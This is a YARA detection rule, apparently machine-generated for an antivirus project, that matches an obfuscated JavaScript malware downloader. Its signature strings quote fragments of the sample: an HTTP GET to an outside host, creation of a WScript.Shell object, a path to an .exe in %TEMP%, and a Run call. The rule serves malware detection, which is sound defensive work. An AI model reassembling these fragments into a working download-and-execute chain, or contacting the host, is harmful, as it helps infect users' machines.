rule sig_20160401_48fec701477348211ace23197ee4c8cf {
  meta:
    description = "datamaliciousorder - file 20160401_48fec701477348211ace23197ee4c8cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c11ff60f8d2bc58b9f021e39e10245b93bbb7017859d67e15282c25d140eae36"

  strings:
    $s1  = "XlKd[YwlPn](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "var InVnh = function VxtCt() {return WScript[MksKzo](\"WScript\"+\".Shell\");}(), XrIn = 11;" fullword ascii
    $s3  = "function KlVg(ZwlPas, GwNfg){WsAxk = WsAxk * 1; return ZwlPas - GwNfg;};" fullword ascii
    $s4  = "if (XlKd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TiYd() {return InVnh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"m3XWx6Kmto4c2LOX.ex\" + \"e\";};" fullword ascii
    $s6  = "function XaIm(){return GgCnn + \"\";};" fullword ascii
    $s7  = "function XanCd() {return ((HbwCn == true) && (HbwCn == JtlCec)) ? 1 : WsAxk;};" fullword ascii
    $s8  = "function ZoeUep(TxYm){InVnh[\"R\"+\"un\"](TxYm, WsAxk, WsAxk);};" fullword ascii
    $s9  = "HbwCn = true; " fullword ascii
    $s10 = "function JccCfk(){return 23;};" fullword ascii
    $s11 = "function LpxCd(LthKwh) {var ZtdOi = (1, 2, 3, 4, 5, LthKwh); return ZtdOi;};" fullword ascii
    $s12 = "var AjMd = new this[\"Date\"]();" fullword ascii
    $s13 = "function OmDql(){return MksKzo;};" fullword ascii
    $s14 = "}while (MmmNa);" fullword ascii
    $s15 = "function JunBmk()" fullword ascii
    $s16 = "JtlCec = true; " fullword ascii
    $s17 = "var FjcUa = false;" fullword ascii
    $s18 = "var HbwCn = false;" fullword ascii
    $s19 = "var JtlCec = false;" fullword ascii
    $s20 = "return KlVg(EwxGu, SyqRrb);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}